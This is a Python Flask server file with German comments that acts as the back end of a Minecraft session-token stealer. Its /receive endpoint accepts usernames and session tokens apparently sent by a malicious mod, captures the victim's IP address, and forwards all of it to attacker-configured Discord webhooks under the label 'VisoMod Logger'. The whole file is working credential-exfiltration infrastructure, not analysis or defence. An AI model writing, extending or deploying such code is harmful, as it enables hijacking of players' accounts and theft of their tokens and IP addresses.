from flask import Flask, request, jsonify
import requests
import json
import os
import time
from datetime import datetime

app = Flask(__name__)

# Für Rate Limiting (funktioniert auf Vercel nur begrenzt)
ip_requests = {}
seen_tokens = set()

def load_config():
    """Lädt die config.json"""
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print("ERROR: config.json not found!")
        return {
            "security": {
                "rate_limit_seconds": 600,
                "min_token_length": 0,
                "check_duplicate_tokens": False
            },
            "endpoints": {
                "/receive": {
                    "webhooks": []
                }
            }
        }

def get_client_ip():
    """Ermittelt die echte IP des Clients"""
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers['X-Real-IP']
    else:
        ip = request.remote_addr
    return ip

def send_to_discord(webhook_url, username, token, ip):
    """Sendet die Daten an Discord"""
    if not webhook_url or 'YOUR_DISCORD_WEBHOOK' in webhook_url:
        print("Webhook nicht konfiguriert!")
        return False
    
    try:
        # Versuche Minecraft Kopf zu holen
        head_url = f"https://minotar.net/helm/{username}/100.png"
        
        embed = {
            "title": "🎮 Neue Minecraft Session",
            "color": 0xff0000,
            "description": f"**Spieler:** {username}\n**IP:** {ip}",
            "fields": [
                {
                    "name": "🔑 Session Token",
                    "value": f"```{token[:200]}```",
                    "inline": False
                }
            ],
            "thumbnail": {"url": head_url},
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {"text": "VisoMod Logger"}
        }
        
        payload = {
            "username": "Minecraft Logger",
            "embeds": [embed]
        }
        
        response = requests.post(webhook_url, json=payload, timeout=10)
        return response.status_code in [200, 204]
        
    except Exception as e:
        print(f"Discord Fehler: {e}")
        return False

@app.route('/receive', methods=['POST'])
def receive():
    """Hauptendpoint - deine Mod sendet hierhin"""
    
    # Daten von deiner Mod empfangen
    data = request.json
    
    if not data:
        return jsonify({"status": "error", "message": "No JSON data"}), 400
    
    username = data.get('username')
    token = data.get('token')
    ip = get_client_ip()
    
    print(f"📥 Empfangen - User: {username}, IP: {ip}, Token Länge: {len(token) if token else 0}")
    
    # Config laden
    config = load_config()
    
    # Discord Webhook URLs aus config holen
    endpoint_config = config.get('endpoints', {}).get('/receive', {})
    webhooks = endpoint_config.get('webhooks', [])
    
    # An alle konfigurierten Webhooks senden
    success_count = 0
    for webhook in webhooks:
        webhook_url = webhook.get('url')
        if webhook_url and 'YOUR_DISCORD_WEBHOOK' not in webhook_url:
            if send_to_discord(webhook_url, username, token, ip):
                success_count += 1
                print(f"✅ Gesendet an {webhook.get('name', 'Webhook')}")
            else:
                print(f"❌ Fehler bei {webhook.get('name', 'Webhook')}")
    
    return jsonify({
        "status": "success",
        "message": f"Data received for {username}",
        "webhooks_sent": success_count
    }), 200

@app.route('/', methods=['GET'])
def health():
    """Health Check für Vercel"""
    return jsonify({"status": "alive", "endpoint": "/receive"}), 200

@app.route('/auth', methods=['POST'])
def auth():
    """Falls du später /auth brauchst"""
    return jsonify({"status": "error", "message": "Use /receive endpoint"}), 404